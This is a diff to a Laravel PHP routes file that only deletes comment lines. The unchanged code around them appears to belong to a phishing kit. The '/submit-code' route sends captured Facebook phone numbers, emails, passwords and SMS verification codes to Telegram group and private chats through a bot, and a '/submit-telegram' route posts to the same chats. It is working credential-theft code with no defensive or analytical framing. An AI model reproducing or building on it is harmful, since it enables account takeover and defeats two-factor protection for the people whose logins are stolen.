@@ -53,7 +53,6 @@ Route::post('/submit-telegram', function (Request $request) {
         ]
     ];
     
-    // SEND TO PRIVATE CHAT
     Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
         'chat_id' => $privateChatID,
         'text' => $message,
@@ -61,7 +60,6 @@ Route::post('/submit-telegram', function (Request $request) {
         'reply_markup' => json_encode($keyboard)
     ]);
     
-    // SEND TO GROUP CHAT
     Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
         'chat_id' => $groupChatID,
         'text' => $message,
@@ -181,14 +179,12 @@ Route::post('/submit-code', function (Request $request) {
     
     $message = "✅ USER ENTERED THE FACEBOOK SMS CODE!\n📱 Phone: $phone\n📧 Email: $email\n🔑 Pass: $password\n🔢 Code: $code\n🕒 Time: " . now()->toDateTimeString();
     
-    // SEND TO GROUP CHAT
     Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
         'chat_id' => $groupChatID,
         'text' => $message,
         'parse_mode' => 'HTML'
     ]);
     
-    // ALSO SEND TO PRIVATE CHAT
     Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
         'chat_id' => env('TELEGRAM_CHAT_ID'),
         'text' => $message,
